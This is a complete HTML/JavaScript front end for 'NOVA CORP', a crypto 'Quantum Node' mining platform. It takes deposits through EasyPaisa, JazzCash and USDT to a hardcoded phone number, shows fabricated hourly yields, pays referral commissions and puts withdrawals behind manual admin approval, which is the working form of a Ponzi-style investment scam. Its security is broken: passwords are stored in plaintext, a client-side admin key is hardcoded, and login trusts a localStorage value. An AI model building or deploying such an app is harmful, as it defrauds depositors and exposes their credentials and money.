<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | ALL-IN-ONE TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; }
        body { background: #F4F7FA; font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .glass-card { background: rgba(255, 255, 255, 0.95); border: 1px solid #e2e8f0; border-radius: 32px; box-shadow: 0 10px 30px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 20px; font-weight: 800; cursor: pointer; transition: 0.3s; border: none; }
        .screen { display: none; min-height: 100vh; width: 100%; padding-bottom: 130px; }
        .active-screen { display: block; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 20px; left: 5%; width: 90%; background: #0F172A; border-radius: 30px; display: flex; justify-content: space-around; padding: 18px 0; z-index: 1000; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
        .nav-item { color: #64748b; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 6px; }
        .nav-item.active { color: var(--gold); }
        .node-img { width: 100%; height: 200px; object-fit: cover; border-radius: 25px; }
        .ticker-wrap { background: #0F172A; color: var(--gold); padding: 8px 0; font-size: 10px; font-weight: 900; overflow: hidden; border-bottom: 2px solid var(--gold); }
        .ticker-move { display: inline-block; white-space: nowrap; animation: ticker 30s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .admin-badge { background: #fee2e2; color: #ef4444; padding: 4px 10px; border-radius: 10px; font-size: 9px; font-weight: 800; }
    </style>
</head>
<body>

    <div id="auth-screen" class="active-screen min-h-screen flex flex-col justify-center p-10 bg-white">
        <div class="text-center mb-12">
            <h1 class="text-7xl font-black italic tracking-tighter">NO<span class="text-gold">VA</span></h1>
            <p class="text-[11px] font-bold text-slate-400 tracking-[0.6em] mt-3 uppercase">Master Core Infrastructure</p>
        </div>
        <div class="space-y-4 max-w-sm mx-auto w-full">
            <input type="text" id="u-id" placeholder="Username" class="w-full p-5 rounded-3xl bg-slate-50 border-none font-bold outline-none">
            <input type="password" id="u-pw" placeholder="Security Key" class="w-full p-5 rounded-3xl bg-slate-50 border-none font-bold outline-none">
            <input type="text" id="u-ref" placeholder="Invitation Code (Optional)" class="w-full p-5 rounded-3xl bg-slate-50 border-none font-bold text-xs">
            <button onclick="handleAuth()" class="w-full btn-gold py-5 shadow-2xl text-xs tracking-[0.2em] uppercase">Access Terminal</button>
            <p onclick="toggleAuth()" id="auth-btn-text" class="text-[10px] text-center text-slate-400 font-black uppercase cursor-pointer underline">Create Global Node</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div class="ticker-wrap"><div class="ticker-move" id="live-news">SYSTEM ONLINE • MULTI-PAYMENT GATEWAY ACTIVE • ALL WITHDRAWALS PROCESSING NORMALLY • NEW V21 QUANTUM NODES NOW AVAILABLE FOR DEPLOYMENT • </div></div>
        
        <header class="p-6 flex justify-between items-center bg-white/80 backdrop-blur sticky top-0 z-[100] border-b">
            <h2 id="logo-main" class="font-black text-2xl italic tracking-tighter cursor-pointer">NO<span class="text-gold">VA</span></h2>
            <div class="text-right">
                <p id="user-tag" class="text-[8px] font-black uppercase text-slate-400">@LOADING</p>
                <p id="b-header" class="text-xl font-black text-slate-950 tracking-tighter">$0.00</p>
            </div>
        </header>

        <div id="scr-dash" class="screen active-screen px-6 pt-6">
            <div class="bg-slate-950 rounded-[45px] p-10 text-white mb-8 shadow-2xl border-b-[12px] border-gold relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[9px] text-slate-500 uppercase font-black mb-1">Current Liquidity</p>
                    <h1 id="b-main" class="text-6xl font-black mb-12 tracking-tighter">$0.00</h1>
                    <div class="flex justify-between items-end border-t border-white/10 pt-8">
                        <div><p class="text-[8px] text-slate-500 uppercase font-black">Mining Profit</p><p id="b-daily" class="text-2xl font-black text-green-400">+$0.00</p></div>
                        <div class="text-right"><p class="text-[8px] text-slate-500 uppercase font-black">Cumulative Yield</p><p id="b-total-p" class="text-2xl font-black text-gold">$0.00</p></div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-3 gap-5 mb-10">
                <div onclick="openModal('mod-dep')" class="glass-card p-6 text-center"><i class="fa-solid fa-bolt-lightning text-gold text-2xl mb-2"></i><p class="text-[9px] font-black uppercase">Deposit</p></div>
                <div onclick="openModal('mod-wd')" class="glass-card p-6 text-center"><i class="fa-solid fa-receipt text-slate-400 text-2xl mb-2"></i><p class="text-[9px] font-black uppercase">Withdraw</p></div>
                <div onclick="claimDaily()" class="glass-card p-6 text-center"><i class="fa-solid fa-parachute-box text-blue-500 text-2xl mb-2"></i><p class="text-[9px] font-black uppercase">Airdrop</p></div>
            </div>

            <div class="glass-card p-7 border-dashed border-2 border-slate-300">
                <h4 class="text-[9px] font-black text-slate-400 uppercase mb-2">Network Invitation Link</h4>
                <div class="flex items-center justify-between bg-slate-50 p-4 rounded-2xl">
                    <span id="ref-link" class="text-[11px] font-bold text-slate-600 truncate mr-4">...</span>
                    <i onclick="copyRef()" class="fa-solid fa-copy text-gold text-lg cursor-pointer"></i>
                </div>
            </div>
        </div>

        <div id="scr-nodes" class="screen px-6 pt-8">
            <h3 class="font-black text-3xl mb-10 italic uppercase">Quantum Nodes</h3>
            <div id="nodes-grid" class="space-y-10"></div>
        </div>

        <div id="scr-team" class="screen px-6 pt-8">
            <h3 class="font-black text-3xl mb-10 italic uppercase">Network Hub</h3>
            <div class="grid grid-cols-2 gap-5 mb-10">
                <div class="glass-card p-10 bg-slate-900 text-white text-center"><h5 id="team-count" class="text-5xl font-black text-gold">0</h5><p class="text-[9px] font-black uppercase mt-3 tracking-widest">Active Partners</p></div>
                <div class="glass-card p-10 text-center"><h5 id="team-comm" class="text-4xl font-black">$0</h5><p class="text-[9px] font-black text-slate-400 uppercase mt-3 tracking-widest">Team Earnings</p></div>
            </div>
            <div id="team-list" class="space-y-4"></div>
        </div>

        <div id="scr-admin" class="screen px-6 pt-8">
            <div class="flex justify-between items-center mb-10">
                <h3 class="text-3xl font-black text-red-600 italic uppercase">Core Admin</h3>
                <span class="admin-badge">MASTER ACCESS</span>
            </div>
            
            <div class="glass-card p-8 bg-slate-950 text-white mb-8">
                <p class="text-[10px] font-black text-slate-500 mb-6 uppercase tracking-[0.2em]">Gateway Control</p>
                <div class="space-y-4">
                    <div class="grid grid-cols-2 gap-4">
                        <input type="text" id="adm-ep" placeholder="EasyPaisa No" class="p-4 rounded-2xl text-black font-bold text-sm">
                        <input type="text" id="adm-jc" placeholder="JazzCash No" class="p-4 rounded-2xl text-black font-bold text-sm">
                    </div>
                    <input type="text" id="adm-bin" placeholder="Binance ID / USDT Address" class="w-full p-4 rounded-2xl text-black font-bold text-sm">
                    <input type="number" id="adm-tax" placeholder="Withdrawal Tax %" class="w-full p-4 rounded-2xl text-black font-bold text-sm">
                    <button onclick="saveAdminSettings()" class="w-full btn-gold py-5 uppercase text-xs">Update System Protocols</button>
                </div>
            </div>

            <div class="mb-6"><h4 class="font-black text-xs uppercase text-slate-400 mb-4">Pending Verifications</h4><div id="adm-pending" class="space-y-4"></div></div>
            <div class="mb-6"><h4 class="font-black text-xs uppercase text-slate-400 mb-4">User Registry</h4><div id="adm-users" class="space-y-3"></div></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('scr-dash', this)" class="nav-item active"><i class="fa-solid fa-chart-pie text-2xl"></i><span>CORE</span></div>
            <div onclick="nav('scr-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-2xl"></i><span>NODES</span></div>
            <div onclick="nav('scr-team', this)" class="nav-item"><i class="fa-solid fa-network-wired text-2xl"></i><span>HUB</span></div>
            <div id="nav-adm" onclick="nav('scr-admin', this)" class="nav-item text-red-600" style="display:none;"><i class="fa-solid fa-user-gear text-2xl"></i><span>MASTER</span></div>
        </nav>
    </div>

    <div id="mod-dep" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-3xl uppercase italic">Deposit Hub</h2><i onclick="closeModal('mod-dep')" class="fa-solid fa-xmark text-4xl text-slate-200"></i></div>
        <div class="grid grid-cols-2 gap-4 mb-10">
            <div onclick="showWay('ep')" class="glass-card p-6 text-center border-2 border-slate-100"><i class="fa-solid fa-mobile-button text-green-500 text-xl mb-2"></i><p class="text-[9px] font-black uppercase">EasyPaisa</p></div>
            <div onclick="showWay('jc')" class="glass-card p-6 text-center border-2 border-slate-100"><i class="fa-solid fa-wallet text-red-500 text-xl mb-2"></i><p class="text-[9px] font-black uppercase">JazzCash</p></div>
            <div onclick="showWay('bin')" class="glass-card p-6 text-center border-2 border-slate-100"><i class="fa-brands fa-bitcoin text-yellow-500 text-xl mb-2"></i><p class="text-[9px] font-black uppercase">USDT/Binance</p></div>
            <div onclick="alert('Connect Wallet Feature Coming Soon')" class="glass-card p-6 text-center border-2 border-slate-100 opacity-50"><i class="fa-solid fa-link text-blue-500 text-xl mb-2"></i><p class="text-[9px] font-black uppercase">Web3 Wallet</p></div>
        </div>
        <div id="way-info" class="bg-slate-950 text-gold p-10 rounded-[40px] mb-10 hidden text-center shadow-2xl border-b-8 border-gold">
            <p id="way-label" class="text-[9px] font-black uppercase text-slate-500 mb-3">Gateway Address</p>
            <p id="way-num" class="text-2xl font-black tracking-tighter">SELECT METHOD</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Enter USD Amount" class="w-full p-6 bg-slate-50 rounded-3xl mb-5 font-bold outline-none border-none">
        <input type="text" id="dep-tx" placeholder="Transaction ID / Hash" class="w-full p-6 bg-slate-50 rounded-3xl mb-10 font-bold outline-none border-none uppercase">
        <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-7 uppercase tracking-[0.3em] text-sm shadow-2xl">Validate Transaction</button>
    </div>

    <div id="mod-wd" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-3xl uppercase italic">Withdraw Portal</h2><i onclick="closeModal('mod-wd')" class="fa-solid fa-xmark text-4xl text-slate-200"></i></div>
        <div class="space-y-5 mb-10">
            <select id="wd-method" class="w-full p-6 bg-slate-50 rounded-3xl font-bold outline-none border-none appearance-none">
                <option value="EasyPaisa">EasyPaisa</option>
                <option value="JazzCash">JazzCash</option>
                <option value="Binance Pay">Binance Pay</option>
                <option value="Trust Wallet (USDT)">Trust Wallet (USDT)</option>
                <option value="MetaMask">MetaMask</option>
                <option value="Local Bank">Local Bank</option>
            </select>
            <input type="number" id="wd-amt" placeholder="Withdraw Amount ($)" class="w-full p-6 bg-slate-50 rounded-3xl font-bold outline-none border-none">
            <input type="text" id="wd-acc" placeholder="Account Number / Wallet Address" class="w-full p-6 bg-slate-50 rounded-3xl font-bold outline-none border-none">
        </div>
        <button onclick="handleFinance('Withdraw')" class="w-full btn-gold py-7 uppercase tracking-[0.3em] text-sm shadow-2xl">Request Liquidation</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // CONFIGURATION
        const fbCfg = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(fbCfg); const db = getFirestore(app);

        let user = localStorage.getItem('nova_user');
        let mode = 'login'; let tapCount = 0;
        let sys = { ep: "03279177196", jc: "03279177196", bin: "PAY-ID-88221", tax: 5 };

        // 21 HIGH-TECH NODES
        const nodes = [];
        const nodeImgs = [
            "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=600",
            "https://images.unsplash.com/photo-1644088379091-d574269d422f?w=600",
            "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=600",
            "https://images.unsplash.com/photo-1518770660439-4636190af475?w=600"
        ];
        for(let i=0; i<21; i++) {
            nodes.push({ 
                id: i+1, 
                n: `QUANTUM NODE V${i+1}`, 
                c: 10 + (i * 20), 
                y: 1.5 + (i * 1.8), 
                days: 30 + i, 
                img: nodeImgs[i % 4] 
            });
        }

        // AUTH ENGINE
        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            const ref = document.getElementById('u-ref').value.toLowerCase().trim() || 'none';
            if(!id || !pw) return alert("Security protocols require all fields.");
            
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(mode === 'login') {
                if(snap.exists() && snap.data().pw === pw) {
                    if(snap.data().status === 'Banned') return alert("This Node has been suspended.");
                    localStorage.setItem('nova_user', id); location.reload();
                } else alert("Access Denied: Invalid Credentials.");
            } else {
                if(snap.exists()) return alert("Node ID already registered.");
                await setDoc(uRef, { bal: 0, tp: 0, pw: pw, daily: 0, team_bal: 0, refBy: ref, active: [], lastClaim: 0, status: 'Active' });
                localStorage.setItem('nova_user', id); location.reload();
            }
        };

        // APPLICATION CORE
        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('ref-link').innerText = `${window.location.origin}/?ref=${id}`;

            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u || u.status === 'Banned') { localStorage.clear(); location.reload(); }
                document.getElementById('user-tag').innerText = `@${id}`;
                document.getElementById('b-main').innerText = `$${u.bal.toFixed(2)}`;
                document.getElementById('b-header').innerText = `$${u.bal.toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${u.daily.toFixed(2)}`;
                document.getElementById('b-total-p').innerText = `$${(u.tp || 0).toFixed(2)}`;
                renderNodes(u.active || []);
            });

            onSnapshot(query(collection(db, "users"), where("refBy", "==", id)), s => {
                document.getElementById('team-count').innerText = s.size;
                const list = document.getElementById('team-list'); list.innerHTML = "";
                s.forEach(doc => { 
                    list.innerHTML += `<div class="glass-card p-5 flex justify-between items-center text-xs"><b>@${doc.id}</b><span class="text-green-500 font-black tracking-widest uppercase">Connected</span></div>`; 
                });
            });

            onSnapshot(doc(db, "config", "master"), d => { if(d.exists()) sys = d.data(); });
        }

        // NODES RENDERER
        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodes.forEach(n => {
                const isRun = active.includes(n.id);
                grid.innerHTML += `<div class="glass-card overflow-hidden relative">
                    <img src="${n.img}" class="node-img">
                    <div class="p-8">
                        <div class="flex justify-between items-start mb-6">
                            <div>
                                <h4 class="font-black text-lg uppercase italic mb-1">${n.n}</h4>
                                <p class="text-[10px] font-black text-green-500 uppercase">Yield: $${n.y.toFixed(2)} / Hour</p>
                            </div>
                            ${isRun ? `<span class="bg-green-100 text-green-600 px-5 py-2 rounded-full text-[10px] font-black animate-pulse">ACTIVE MINING</span>` : `<button onclick="buyNode(${n.id}, ${n.c}, ${n.y})" class="btn-gold px-8 py-4 text-[10px] uppercase shadow-lg">$${n.c} DEPLOY</button>`}
                        </div>
                        <div class="flex justify-between border-t pt-5">
                            <span class="text-[9px] font-black text-slate-400 uppercase">Operational: ${n.days} Days</span>
                            <span class="text-[9px] font-black text-slate-400 uppercase">Status: OK</span>
                        </div>
                    </div>
                </div>`;
            });
        }

        // FINANCIAL ENGINE
        window.buyNode = async (id, c, y) => {
            const uRef = doc(db, "users", user); const s = await getDoc(uRef);
            if(s.data().bal < c) return alert("Liquidity Error: Insufficient Balance.");
            await updateDoc(uRef, { bal: s.data().bal - c, active: [...s.data().active, id], daily: (s.data().daily || 0) + y });
            
            if(s.data().refBy && s.data().refBy !== 'none') {
                const rRef = doc(db, "users", s.data().refBy); const rs = await getDoc(rRef);
                if(rs.exists()) await updateDoc(rRef, { bal: rs.data().bal + (c*0.1), team_bal: (rs.data().team_bal || 0) + (c*0.1), tp: (rs.data().tp || 0) + (c*0.1) });
            }
            alert("Quantum Node successfully integrated into your cluster!");
        };

        window.claimDaily = async () => {
            const uRef = doc(db, "users", user); const s = await getDoc(uRef);
            if(Date.now() - (s.data().lastClaim || 0) < 86400000) return alert("Node Airdrop available in 24 hours.");
            await updateDoc(uRef, { bal: s.data().bal + 0.30, tp: (s.data().tp || 0) + 0.30, lastClaim: Date.now() });
            alert("Airdrop of $0.30 processed successfully!");
        };

        window.handleFinance = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const ref = document.getElementById(type === 'Deposit' ? 'dep-tx' : 'wd-acc').value;
            if(!amt || !ref) return alert("Data mismatch: Fields cannot be empty.");
            await addDoc(collection(db, "logs"), { user, type, amount: amt, ref, status: 'Pending', timestamp: Date.now(), method: type === 'Withdraw' ? document.getElementById('wd-method').value : 'Gateway' });
            alert("Ticket broadcasted to the Master Terminal.");
            closeModal('mod-dep'); closeModal('mod-wd');
        };

        // MASTER ADMIN LOGIC
        document.getElementById('logo-main').onclick = () => {
            tapCount++; if(tapCount >= 5) {
                if(prompt("Enter Master Access Key:") === "nov786") { 
                    document.getElementById('nav-adm').style.display="flex"; 
                    loadMasterAdmin(); 
                    alert("Master Terminal Unlocked.");
                }
                tapCount = 0;
            }
        };

        function loadMasterAdmin() {
            // Pending Requests
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const list = document.getElementById('adm-pending'); list.innerHTML = "";
                s.forEach(d => {
                    list.innerHTML += `<div class="glass-card p-6 flex justify-between items-center bg-white border-l-4 border-gold">
                        <div class="text-[10px]">
                            <b class="text-slate-900">@${d.data().user}</b> [${d.data().type}]<br>
                            $${d.data().amount} via ${d.data().method || 'N/A'}<br>
                            <span class="text-slate-400 font-mono">${d.data().ref}</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="approveAction('${d.id}', '${d.data().user}', ${d.data().amount}, '${d.data().type}')" class="bg-green-500 text-white p-3 rounded-xl"><i class="fa-solid fa-check"></i></button>
                            <button onclick="deleteLog('${d.id}')" class="bg-red-500 text-white p-3 rounded-xl"><i class="fa-solid fa-trash"></i></button>
                        </div>
                    </div>`;
                });
            });

            // User Management
            onSnapshot(collection(db, "users"), s => {
                const ulist = document.getElementById('adm-users'); ulist.innerHTML = "";
                s.forEach(d => {
                    ulist.innerHTML += `<div class="glass-card p-4 flex justify-between items-center bg-white">
                        <div class="text-[10px]"><b>@${d.id}</b> | Bal: $${d.data().bal.toFixed(2)} | Status: ${d.data().status}</div>
                        <div class="flex gap-2">
                            <button onclick="updateUserStatus('${d.id}', 'Active')" class="text-green-500 text-xs"><i class="fa-solid fa-user-check"></i></button>
                            <button onclick="updateUserStatus('${d.id}', 'Banned')" class="text-red-500 text-xs"><i class="fa-solid fa-user-slash"></i></button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approveAction = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const us = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { bal: (us.data().bal || 0) + amt });
            if(type === 'Withdraw') {
                if(us.data().bal < amt) return alert("User has insufficient funds now.");
                await updateDoc(uRef, { bal: (us.data().bal || 0) - amt });
            }
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
            alert("Terminal Command Executed.");
        };

        window.updateUserStatus = async (uid, stat) => { await updateDoc(doc(db, "users", uid), { status: stat }); };
        window.deleteLog = async (id) => { if(confirm("Discard this ticket?")) await deleteDoc(doc(db, "logs", id)); };
        
        window.saveAdminSettings = async () => {
            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, bin: document.getElementById('adm-bin').value, tax: parseFloat(document.getElementById('adm-tax').value) };
            await setDoc(doc(db, "config", "master"), up, { merge: true }); alert("Master protocols updated.");
        };

        // UI HELPERS
        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active');
        };
        window.showWay = (t) => { 
            document.getElementById('way-info').classList.remove('hidden'); 
            document.getElementById('way-num').innerText = sys[t] || "PROTOCOL_PENDING";
            document.getElementById('way-label').innerText = t.toUpperCase();
        };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.toggleAuth = () => { mode = mode === 'login' ? 'reg' : 'login'; document.getElementById('auth-btn-text').innerText = mode === 'login' ? "Create Global Node" : "Back to Login"; };
        window.copyRef = () => { navigator.clipboard.writeText(document.getElementById('ref-link').innerText); alert("Invitation Link Encrypted & Copied."); };

        if(user) initApp(user);
    </script>
</body>
</html>
